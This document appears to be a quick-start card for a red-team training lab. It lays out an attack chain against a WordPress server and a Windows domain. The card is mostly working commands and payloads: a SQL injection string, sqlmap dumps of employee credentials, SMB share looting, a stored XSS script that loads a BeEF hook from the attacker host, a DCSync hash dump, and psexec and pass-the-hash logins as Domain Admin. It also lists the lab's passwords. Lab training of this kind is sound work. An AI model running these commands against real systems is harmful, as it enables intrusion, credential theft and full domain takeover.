# Red Team Lab - Quick Start Card

## Network Map
```
INTERNET            DMZ                 INTERNAL
172.16.0.0/24       172.16.1.0/24       172.16.2.0/24
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│ kali        │     │ webserver   │     │ WIN-DC01    │
│ .0.10    ───┼─────┼─► .1.10     ├─────┼─► .2.10     │
│ (you)       │     │ (WordPress) │     │ (DC)        │
└─────────────┘     └─────────────┘     │ fileserver  │
                                        │  .2.20      │
                                        │ ws01 .2.30  │
                                        └─────────────┘
```

---

## Phase 1: Recon
```bash
# Discover hosts
nmap -sn 172.16.1.0/24

# Scan webserver
nmap -sV -sC 172.16.1.10
```

---

## Phase 2: SQL Injection
```bash
# Find directories
gobuster dir -u http://172.16.1.10 -w /usr/share/wordlists/dirb/common.txt

# Test SQLi (visit in browser or curl)
http://172.16.1.10/employee-directory/?search=' OR '1'='1

# Dump credentials with sqlmap
sqlmap -u "http://172.16.1.10/employee-directory/?search=test" \
  -D wordpress -T wp_acme_employees --dump --batch
```

**Credentials found:**
| User | Password |
|------|----------|
| jsmith | Summer2024 |
| mwilliams | Welcome123 |
| svc_backup | Backup2024! |

---

## Phase 3: Lateral Movement (SMB)
```bash
# List shares
smbclient -L //172.16.2.20 -U svc_backup%Backup2024!

# Access sensitive share
smbclient //172.16.2.20/sensitive -U svc_backup%Backup2024!

# Download everything
smbget -R smb://172.16.2.20/sensitive -U svc_backup%Backup2024!

# Read the loot
cat passwords.txt
```

**Found:** `Domain Admin: Adm1n2024!`

---

## Phase 4: BeEF (XSS)
```bash
# Start BeEF
beef-xss
# Console: http://127.0.0.1:3000/ui/panel (beef/beef)

# Inject hook via SQLi
sqlmap -u "http://172.16.1.10/employee-directory/?search=test" \
  --sql-query="UPDATE wp_acme_employees SET notes='<script src=\"http://172.16.0.10:3000/hook.js\"></script>' WHERE employee_id='EMP001'"
```
Wait for victim browser to appear in BeEF console.

---

## Phase 5: DCSync Attack
```bash
# Dump all domain hashes
impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
```

---

## Phase 6: Domain Admin
```bash
# Option 1: Use password from file
impacket-psexec 'acmewidgets.local/Administrator:Adm1n2024!@172.16.2.10'

# Option 2: Pass-the-Hash (use hash from DCSync)
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM> Administrator@172.16.2.10

# Verify access
whoami
net group "Domain Admins" /domain
```

---

## Attack Chain Summary
```
SQLi → Creds → SMB → Files → Domain Admin
         ↓
       BeEF → Browser Control
         ↓
      DCSync → All Hashes → Pass-the-Hash
```

---

## Key Credentials
| Account | Password | Access |
|---------|----------|--------|
| jsmith | Summer2024 | AD User, SMB |
| mwilliams | Welcome123 | AD User, Accounting share |
| svc_backup | Backup2024! | AD User, Sensitive share, **DCSync** |
| Administrator | Adm1n2024! | **Domain Admin** |

---

## Troubleshooting

**SQLMap not finding injection?**
```bash
sqlmap -u "URL" --level=3 --risk=3 --batch
```

**SMB connection refused?**
```bash
# Check if port is open
nmap -p 445 172.16.2.20
```

**DCSync fails?**
```bash
# Verify creds work
impacket-smbclient 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
```

**BeEF hook not loading?**
- Check Kali IP is reachable from DMZ
- Verify hook.js URL is correct
- Check browser console for errors
